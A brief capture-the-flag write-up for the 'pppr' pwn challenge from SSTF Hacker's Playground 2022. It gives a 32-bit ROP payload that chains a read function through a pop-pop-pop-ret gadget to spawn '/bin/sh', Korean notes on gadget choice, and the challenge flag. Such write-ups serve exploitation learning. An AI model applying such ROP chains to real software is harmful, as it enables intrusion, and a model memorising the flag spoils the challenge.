## Pwn6

### Source
 * pppr, SSTF Hacker's Playground 2022

### Deploy
 * docker-compose up --build

### Flag
 * `SCTF{Anc13nt_x86_R0P_5kiLl}`

### Exploit
 payload = b"A"*8(s) + b"BBB"(rbp) + p32(r_addr) + p32(pppr) + p32(buf_in_bss) + p32(16) + p32(0) + p32(x_addr) + p32(0) + p32(buf_in_bss)

### Note

* exploit을 보내면 r 함수가 동작하면서 문자열을 읽어들이므로 "/bin/sh"라는 입력을 주면 된다.
* 찾아보면 `0x0804836a : add esp, 8 ; pop ebx ; ret` 가젯도 있어서 이걸로 esp를 12 증가시킬 수 있지만, pppr 가젯을 사용하는 쪽이 더 일반적이다.
